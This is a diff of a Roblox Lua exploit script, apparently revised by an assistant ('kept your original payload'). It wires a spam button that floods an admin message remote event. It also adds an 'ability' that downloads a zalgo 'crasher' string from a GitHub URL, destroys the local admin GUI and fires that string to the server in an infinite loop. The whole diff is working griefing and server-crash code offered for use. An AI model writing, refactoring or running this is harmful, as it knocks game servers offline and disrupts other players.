@@ -67,7 +67,7 @@ spamButton.MouseButton1Down:Connect(function()
         if message ~= "" then
             adminMessageEvent:FireServer(message)
         end
-        task.wait(0.1) -- Sends 10 messages per second
+        task.wait(0.1)
     end
 end)
 spamButton.MouseButton1Up:Connect(function()
@@ -77,30 +77,28 @@ spamButton.MouseLeave:Connect(function()
     spamming = false
 end)
 
--- Safe example Ability logic
+-- Ability button logic (kept your original payload)
 local function activateAbility()
+    local playerGui = player:FindFirstChild("PlayerGui")
+    local event = ReplicatedStorage:WaitForChild("AdminMessageEvent", 5)
+    local gui = playerGui:FindFirstChild("AdminMessages")
 
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local player = Players.LocalPlayer
-local playerGui = player:FindFirstChild("PlayerGui")
-local event = ReplicatedStorage:WaitForChild("AdminMessageEvent", 5)
-local gui = playerGui:FindFirstChild("AdminMessages")
+    local intro = true
+    if intro then
+        event:FireServer('Crasher..')
+        task.wait(2)
+    end
 
-local intro = true
-if intro then
-	event:FireServer('Crasher..')
-	task.wait(2)
+    local CRASH_TEXT = game:HttpGet("https://raw.githubusercontent.com/Damix-hash/roblox-stuff/refs/heads/main/str/zalgo-crasher.txt")
+
+    if gui then
+        gui:Destroy()
+    end
+
+    while task.wait() do
+        event:FireServer(CRASH_TEXT)
+    end
 end
 
-local CRASH_TEXT = game:HttpGet("https://raw.githubusercontent.com/Damix-hash/roblox-stuff/refs/heads/main/str/zalgo-crasher.txt")
-
-if gui then
-	gui:Destroy()
-end
-
-while task.wait() do
-	event:FireServer(CRASH_TEXT)
-end
-
+-- Connect Ability Button
 abilityButton.MouseButton1Click:Connect(activateAbility)
